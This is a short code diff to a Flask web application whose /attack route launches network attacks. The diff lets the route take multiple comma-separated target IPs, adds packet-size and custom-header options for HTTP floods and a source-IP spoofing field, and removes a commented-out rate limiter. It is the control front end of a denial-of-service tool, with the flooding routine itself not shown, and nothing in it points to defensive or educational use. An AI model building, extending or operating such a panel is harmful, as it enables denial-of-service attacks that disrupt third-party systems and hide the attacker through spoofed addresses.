@@ -11,17 +11,18 @@ def index():
     return render_template('index.html')
 
 @app.route('/attack', methods=['GET', 'POST'])
-# @limiter.limit("10 per minute")
 def attack():
     if request.method == 'POST':
         attack_type = request.form['attack_type']
-        target_ip = request.form['target_ip']
+        target_ips = request.form['target_ips'].split(',')
         target_port = int(request.form['target_port'])
         duration = int(request.form['duration'])
         intensity = int(request.form['intensity'])
-        
-        # Start attack
-        start_attack(attack_type, target_ip, target_port, duration, intensity)
+        packet_size = int(request.form.get('packet_size', 1024))  # Default packet size
+        headers = request.form.get('headers')  # Custom headers for HTTP flood
+        spoof_ip = request.form.get('spoof_ip')  # Spoof source IP
+
+        start_attack(attack_type, target_ips, target_port, duration, intensity, packet_size, headers, spoof_ip)
         return redirect(url_for('logs'))
     return render_template('attack.html')
 
